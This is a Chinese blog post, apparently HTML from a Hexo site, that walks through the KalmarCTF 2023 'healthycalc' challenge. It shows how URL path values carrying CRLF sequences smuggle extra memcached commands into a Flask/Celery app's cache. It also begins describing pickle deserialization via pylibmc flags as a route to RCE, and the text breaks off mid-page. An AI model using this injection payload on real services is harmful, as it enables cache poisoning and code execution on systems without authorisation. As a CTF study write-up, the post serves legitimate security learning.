@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>从Pymemcached的CRLF到RCE - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="从Pymemcached的CRLF到RCE - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/07/%E4%BB%8EPymemcached%E7%9A%84CRLF%E5%88%B0RCE/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-06T17:32:58.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>7,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">从Pymemcached的CRLF到RCE</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="1、事情的起因"><a href="#1、事情的起因" class="headerlink" title="1、事情的起因"></a>1、事情的起因</h1><p>在和V&amp;N的师傅打KalmarCTF2023时，碰到了一题叫做healthycalc的题目，这一题当时好像是没有任何思路的，因为整个程序就是一个计算器，但是后面在调试过程中发现了Pymemcache是怎么处理指令的运行和获取的</p>
+<h1 id="2、审计源码"><a href="#2、审计源码" class="headerlink" title="2、审计源码"></a>2、审计源码</h1><p>题目源码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio, os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice, randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Blueprint, jsonify</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPERATION_SYMBOLS = &#123;<span class="string">&quot;add&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;mult&quot;</span>: <span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line">OPERATIONS = &#123;</span><br><span class="line">    <span class="string">&quot;add&quot;</span>: <span class="keyword">lambda</span> lhs, rhs: cache_lookup(_add, lhs, rhs),</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="keyword">lambda</span> lhs, rhs: cache_lookup(_sub, lhs, rhs),</span><br><span class="line">    <span class="string">&quot;mult&quot;</span>: <span class="keyword">lambda</span> lhs, rhs: cache_lookup(_mult, lhs, rhs),</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">application = Flask(__name__)</span><br><span class="line">bp = Blueprint(<span class="string">&quot;routes&quot;</span>, __name__)</span><br><span class="line">celery = Celery(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@bp.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    op = choice(<span class="built_in">list</span>(OPERATIONS.keys()))</span><br><span class="line">    op_sym = OPERATION_SYMBOLS[op]</span><br><span class="line">    a, b = randint(<span class="number">0</span>, <span class="number">9999</span>), randint(<span class="number">0</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Hello! Want to know the result of &lt;a href=&quot;/calc/<span class="subst">&#123;op&#125;</span>/<span class="subst">&#123;a&#125;</span>/<span class="subst">&#123;b&#125;</span>&quot;&gt;<span class="subst">&#123;a&#125;</span> <span class="subst">&#123;op_sym&#125;</span> <span class="subst">&#123;b&#125;</span>&lt;/a&gt;?&lt;br/&gt;Might take a second or two to calculate first time!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@bp.route(<span class="params"><span class="string">&quot;/calc/&lt;operation&gt;/&lt;lhs&gt;/&lt;rhs&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">operation: <span class="built_in">str</span>, lhs: <span class="built_in">int</span>, rhs: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">if</span> operation <span class="keyword">not</span> <span class="keyword">in</span> OPERATIONS:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;err&quot;</span>: <span class="string">f&quot;Unknown operation: <span class="subst">&#123;operation&#125;</span>&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    f = OPERATIONS[operation]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;ans&quot;</span>: <span class="keyword">await</span> f(lhs, rhs)&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(ex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gp</span>(<span class="params">n</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot; guess precision &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(n).endswith(<span class="string">&quot;.0&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">float</span>(n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">cache_lookup</span>(<span class="params">operation, lhs: <span class="built_in">int</span>, rhs: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    k = <span class="string">f&quot;<span class="subst">&#123;operation.name&#125;</span>_<span class="subst">&#123;lhs&#125;</span>_<span class="subst">&#123;rhs&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> gp(celery.backend.get(k))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># skip cache miss</span></span><br><span class="line"></span><br><span class="line">    ans = gp(<span class="keyword">await</span> operation(lhs, rhs))</span><br><span class="line">    celery.backend.<span class="built_in">set</span>(k, ans)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@celery.task()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">_add</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> gp(x) + gp(y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@celery.task()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">_sub</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> gp(x) - gp(y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@celery.task()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">_mult</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> gp(x) * gp(y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">configure_app</span>(<span class="params">application, **kwargs</span>):</span><br><span class="line">    application.secret_key = os.urandom(<span class="number">16</span>)</span><br><span class="line">    application.config[<span class="string">&quot;result_backend&quot;</span>] = <span class="string">&quot;cache+memcached://192.168.64.128:11211/&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> kwargs.get(<span class="string">&quot;celery&quot;</span>):</span><br><span class="line">        init_celery(kwargs.get(<span class="string">&quot;celery&quot;</span>), application)</span><br><span class="line"></span><br><span class="line">    application.register_blueprint(bp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_celery</span>(<span class="params">celery, app</span>):</span><br><span class="line">    celery.conf.update(app.config)</span><br><span class="line">    TaskBase = celery.Task</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ContextTask</span>(<span class="title class_ inherited__">TaskBase</span>):</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">            <span class="comment"># pretend to do heavy work</span></span><br><span class="line">            <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">with</span> app.app_context():</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">await</span> TaskBase.__call__(self, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    celery.Task = ContextTask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">configure_app(application, celery=celery)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    application.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>程序的代码并不是很多，因此要看起来还是挺容易的，单纯看题目源码你是啥也不会发现的，因为就是一个很正常的运算，唯一有点可疑的估计也就是<code>cache_lookup</code>对缓存的处理了，也就是这里存在着漏洞隐患，这一点是TEL师傅指出的，我则是沿着这里往下深挖。<br>先看题目吧，就是一个计算器<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678088743899-a2fcefce-d587-4893-bef9-7601fd8e9fd8.png#averageHue=%23d1d1d1&clientId=u23478eff-04ec-4&from=paste&height=197&id=uacabb7e7&name=image.png&originHeight=246&originWidth=1615&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15735&status=done&style=none&taskId=ufe66c4a6-e852-4313-93f3-45543277b09&title=&width=1292" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678088756206-94e9d479-8cd5-43f6-aea1-854a515330a9.png#averageHue=%23cccbcb&clientId=u23478eff-04ec-4&from=paste&height=168&id=ud270b003&name=image.png&originHeight=210&originWidth=995&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6766&status=done&style=none&taskId=u6d3b214d-edc1-4b5b-aa16-24ab1196fa9&title=&width=796" alt="image.png"><br>是通过路由变量进行获取的，然后将其进行一些运算，审计源码可以得知，计算的过程大概分为两步，首先判断是不是第一次进行运算，如果是第一次则存入memcache缓存当中，之后再取出相同的数据时，直接从缓存中拿去，实际上就是redis做的事情，但是这里用的是memcache<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678088862960-4d3d6523-5235-4c7e-8e49-165a73d14a2a.png#averageHue=%232f2b2b&clientId=u23478eff-04ec-4&from=paste&height=306&id=u6d4a03f9&name=image.png&originHeight=383&originWidth=1511&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55293&status=done&style=none&taskId=u99f31f94-9c4d-4370-b7cd-f7226fd2aef&title=&width=1208.8" alt="image.png"><br>在set和get处下2个断点，跟踪调试分析一波：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678088943270-30084b13-90f7-4b41-8172-7858066e5936.png#averageHue=%23776041&clientId=u23478eff-04ec-4&from=paste&height=180&id=u3580570c&name=image.png&originHeight=225&originWidth=1503&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43098&status=done&style=none&taskId=uf709d051-79d5-4c24-95e5-cb5be19d31f&title=&width=1202.4" alt="image.png"><br>首先进入的是get方法，跟进去看看：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678088985003-fe296350-9db0-4953-ae6d-4f8f46c78f43.png#averageHue=%23708070&clientId=u23478eff-04ec-4&from=paste&height=491&id=u6f7b945f&name=image.png&originHeight=614&originWidth=1849&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=124062&status=done&style=none&taskId=u807ba3f7-58ca-47b4-a8ee-9a309f90800&title=&width=1479.2" alt="image.png"><br>这里的key是由一系列名称拼接起来的，<code>k = f&quot;&#123;operation.name&#125;_&#123;lhs&#125;_&#123;rhs&#125;&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678118875396-ae69a504-5a8e-4386-979b-497b63a6e93c.png#averageHue=%232e2d2b&clientId=u45f00354-e510-4&from=paste&height=157&id=ud3c1edd5&name=image.png&originHeight=196&originWidth=1294&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39580&status=done&style=none&taskId=u65dc895b-ff6c-4bdc-8f52-dbdb7d9a03f&title=&width=1035.2" alt="image.png"><br>随后是获取self.client,跟进看看是怎么处理的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678118938714-d127f5cb-2c10-43e4-9855-dc535f58f2a0.png#averageHue=%23738975&clientId=u45f00354-e510-4&from=paste&height=729&id=u58a6fa84&name=image.png&originHeight=911&originWidth=1804&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=188373&status=done&style=none&taskId=u1fcf3268-09e0-4c0a-969d-7c5d14ff4f2&title=&width=1443.2" alt="image.png"><br>然后是拿到了client对象，随后直接在最后return返回：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678118960155-7e19bce2-ffb0-4c70-9fcc-8897f4f197ee.png#averageHue=%2389603e&clientId=u45f00354-e510-4&from=paste&height=118&id=u136c5d97&name=image.png&originHeight=147&originWidth=1342&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17322&status=done&style=none&taskId=u5344dbab-2a1e-474e-9e8e-30f8cd4b416&title=&width=1073.6" alt="image.png"><br>退出该方法，回到刚刚的父类调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678118974830-8ce020ad-74e9-4de9-8bbc-3f6c42e2f85c.png#averageHue=%237d5c2b&clientId=u45f00354-e510-4&from=paste&height=128&id=ub99d05c2&name=image.png&originHeight=160&originWidth=1420&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36629&status=done&style=none&taskId=ue6a90815-6a5d-4806-9c01-dca9d03df2f&title=&width=1136" alt="image.png"><br>上面是先拿到了client，然后再调用get方法，这下跟进get方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678119115384-39b55d9e-7528-442e-930d-d925e685f5b4.png#averageHue=%23557b54&clientId=u45f00354-e510-4&from=paste&height=844&id=u4c0598f6&name=image.png&originHeight=1055&originWidth=1536&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=171612&status=done&style=none&taskId=u0444004c-9326-4eaf-bb6f-dfa8f63e97a&title=&width=1228.8" alt="image.png"><br>调用了<code>self.get</code>传入的参数是get，也就是让memcache运行get指令，这是最后一个get方法，接下里是主要逻辑：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678119174188-2cf72e5b-ed45-411e-9c9d-9d3c414db775.png#averageHue=%23805c2e&clientId=u45f00354-e510-4&from=paste&height=174&id=ua3f97433&name=image.png&originHeight=217&originWidth=1460&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41634&status=done&style=none&taskId=ue3396086-53f2-468a-ab09-7a08b2ba206&title=&width=1168" alt="image.png"><br>首先对key进行一次encode，这里的encode实际上就是utf-8编码一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678119198717-b0fdeac8-0397-4e6c-acfb-2e79d1f403c6.png#averageHue=%232e2d2c&clientId=u45f00354-e510-4&from=paste&height=171&id=ue93e013a&name=image.png&originHeight=214&originWidth=910&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32563&status=done&style=none&taskId=ude1cc8cb-e75c-44cc-84c7-aeeb324ca5c&title=&width=728" alt="image.png"><br>然后获取server，然后根据一开始给的<code>cmd=get</code>，它会拼接一段完整的命令给memcache运行：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678119350031-878a74a2-5f64-4537-8622-e9312d359d2c.png#averageHue=%236a785d&clientId=u45f00354-e510-4&from=paste&height=670&id=u24eaea93&name=image.png&originHeight=838&originWidth=1484&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=124728&status=done&style=none&taskId=uf2a1745d-97ec-49e3-bfba-a16c90b5215&title=&width=1187.2" alt="image.png"><br>这里完整的命令就是<code>b&#39;get __main__._mult_1270_960&#39;</code>,也就是获取key对应的value，然后send_cmd执行该命令，到这里就是get命令执行的点<br>剩下的还有对应的set方法，流程也是一样的，这里直接跳到上面说的获取fullcmd的步骤看看运行了什么指令：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678119632737-624c00e0-e645-4ffb-97f9-3eab2e09c433.png#averageHue=%237d6445&clientId=u45f00354-e510-4&from=paste&height=111&id=ud54b4d2e&name=image.png&originHeight=139&originWidth=1032&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25713&status=done&style=none&taskId=u833fb280-c367-4aad-8644-4826087d2b4&title=&width=825.6" alt="image.png"><br>也是先调用client的set:<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678119647595-62dce59b-f621-47aa-a876-e91d3c0e84d6.png#averageHue=%232c2b2b&clientId=u45f00354-e510-4&from=paste&height=115&id=ud1bbafdf&name=image.png&originHeight=144&originWidth=1158&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19257&status=done&style=none&taskId=u1d171c38-bc79-4a80-9f71-3368735d27d&title=&width=926.4" alt="image.png"><br>然后运行memcache的set指令：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678119720941-370d369b-4977-4a6f-9c22-96cf22814048.png#averageHue=%236e887c&clientId=u45f00354-e510-4&from=paste&height=849&id=u37682a89&name=image.png&originHeight=1061&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=253934&status=done&style=none&taskId=u882015db-5888-40dd-b32d-462409dbada&title=&width=1528.8" alt="image.png"><br>fullcmd为<code>b&#39;set __main__._mult_1270_333 2 86400 6 \r\n422910&#39;</code>，也就是在memcache服务器运行了该指令，那么对于该部分我们已经清楚了流程，如果我们可以控制运行指令，是不是就会有更多的思路了?</p>
+<h1 id="3、Memcached-CRLF注入"><a href="#3、Memcached-CRLF注入" class="headerlink" title="3、Memcached CRLF注入"></a>3、Memcached CRLF注入</h1><p>有关memcached的指令在网上找一找就好了，和redis其实很像，以KV对的形式存储的</p>
+<ul>
+<li>set：</li>
+</ul>
+<p><code>set key flags exptime length value  </code></p>
+<ul>
+<li>get：</li>
+</ul>
+<p><code>get key1 key2 key3</code><br>我们现在要说的是CRLF注入<br>所谓CRLF注入在SSRF的时候也很常见，其实算是请求走私的一种方法，而对于Memcached也存在这种风险，仔细观察上面的2个fullcmd：<br><code>&#39;get __main__._mult_1270_960&#39;</code><br><code>&#39;set __main__._mult_1270_333 2 86400 6 \r\n422910&#39;</code><br>单看get指令可能看不出什么，可以看到set指令时有个回车符隔开，末尾的也就是运算结果V，memcached协议是以回车符进行分割的，可以参考这一篇文章：<br>我们可以用<code>\r\n</code>来分割指令，达到运行多条指令的效果，最终也就等于memcached指令可控，如：<br><code>[http://localhost:5000/calc/add/595/2628%0d%0aset](http://localhost:5000/calc/add/595/2628%0d%0aset) uwsgi_file__app_chall._add_1_1 0 3600 3%0d%0a222</code><br>这样我们可以覆盖1+1的值为222了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678121059555-c31a659f-4257-4b02-b77e-62d2c865d40b.png#averageHue=%23fcf9f8&clientId=u45f00354-e510-4&from=paste&height=134&id=ubd7be462&name=image.png&originHeight=167&originWidth=1340&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20904&status=done&style=none&taskId=u1cb546b8-230b-4b31-a943-4cfb8fcdd24&title=&width=1072" alt="image.png"><br>走私成功<br>这里关于<code>uwsgi_file__app_chall</code>有点讲究，这里对应源代码中的<code>f&quot;&#123;operation.name&#125;&quot;</code>,也就是函数的__name__，我们需要观察dockerfile：<br><code>ENTRYPOINT [&quot;uwsgi&quot; &quot;--http-socket&quot; &quot;:5000&quot; &quot;--master&quot; &quot;--processes&quot; &quot;8&quot; &quot;--threads&quot; &quot;4&quot; &quot;--uid&quot; &quot;kalmar&quot; &quot;--gid&quot; &quot;kalmar&quot; &quot;--wsgi-file&quot; &quot;/app/chall.py&quot;]</code><br>他是用uwsgi运行的flask项目，因此主程序不会是<code>__main__</code>在这一点也是卡了我很久，因为这个名字不对，因此导致我覆盖值不成功XD<br>现在我们访问一下<code>/calc/add/1/1</code>看看值为多少：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678121070357-d2c765e4-00ed-44b3-bf1e-c140f2b71acf.png#averageHue=%23afafaf&clientId=u45f00354-e510-4&from=paste&height=634&id=ub2fcd824&name=image.png&originHeight=792&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43466&status=done&style=none&taskId=u19f695e1-bfce-4ee7-9bf3-f5934b9bb85&title=&width=1536" alt="image.png"><br>成功覆盖为222，说明CRLF注入是成功的，那么现在思路又拓宽了，也就是我们可以执行memcached服务器上任意指令，那么能不能进行RCE呢？</p>
+<h1 id="4、Pymemcached-RCE探究"><a href="#4、Pymemcached-RCE探究" class="headerlink" title="4、Pymemcached RCE探究"></a>4、Pymemcached RCE探究</h1><p>我们都知道在进行存储和取出数据时，一般都会进行序列化和反序列化操作，pymemcached也不例外，查阅资料可以看到：<br><a target="_blank" rel="noopener" href="https://sendapatch.se/projects/pylibmc/reference.html">https://sendapatch.se/projects/pylibmc/reference.html</a><br>pymemcached需要依赖pylibmc库，而pylibmc库中就引入了pickle这个概念，pylibmc库是辅助缓存进行存储的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678121281899-d9b7443e-bc21-4638-b066-27c07979ba6f.png#averageHue=%23e6e2d6&clientId=u45f00354-e510-4&from=paste&height=519&id=uf7f53c5c&name=image.png&originHeight=649&originWidth=1581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=582663&status=done&style=none&taskId=u9bcdc64b-11f3-46ee-8c69-ab75f83a043&title=&width=1264.8" alt="image.png"><br>在这里指出，在特定条件下会进行pickle序列化和反序列化，那么到这里思路就清晰了许多，也就是该怎么去触发pickle反序列化的问题了，想要触发就得看懂条件，那么这里就涉及到memcached指令中关于flag的解释了：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xyz_dream/article/details/90453222">https://blog.csdn.net/xyz_dream&#x2F;article&#x2F;details&#x2F;90453222</a><br>flag这个参数在memcached中实际上起到一个标记作用，就是标记你存入的值到底是什么类型，然后依据flag的值不同，进行不同种类的序列化和反序列化，那么啥时候才可以触发pickle呢？我们可以去查阅pylibmc的源码：<br><a target="_blank" rel="noopener" href="https://github.com/lericson/pylibmc/blob/master/src/_pylibmcmodule.h#L75">https://github.com/lericson/pylibmc/blob/master/src/_pylibmcmodule.h#L75</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678121626542-4f818e4b-6042-4a83-9a8f-e99d682b6171.png#averageHue=%23fefefe&clientId=u45f00354-e510-4&from=paste&height=214&id=u3c6b76cd&name=image.png&originHeight=267&originWidth=1693&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22742&status=done&style=none&taskId=u775ffde7-56e1-4852-962a-2b7310a1c99&title=&width=1354.4" alt="image.png"><br>在这里可以清楚的看见，当flag为1时进行pickle相关操作，因此flag的值写死为1，其他的无所谓，然后是在啥时候进行pickle反序列化的呢？<br>在Discord中有一位大牛为我指出了调用栈：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678121870213-1608d1dd-8860-4be9-b17f-ca76ba9fdec4.png#averageHue=%2394bac6&clientId=u45f00354-e510-4&from=paste&height=315&id=ue02fd8a7&name=image.png&originHeight=394&originWidth=1254&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63859&status=done&style=none&taskId=u7f010038-5c1d-4395-b1e0-5cdd580d5ee&title=&width=1003.2" alt="image.png"><br><img 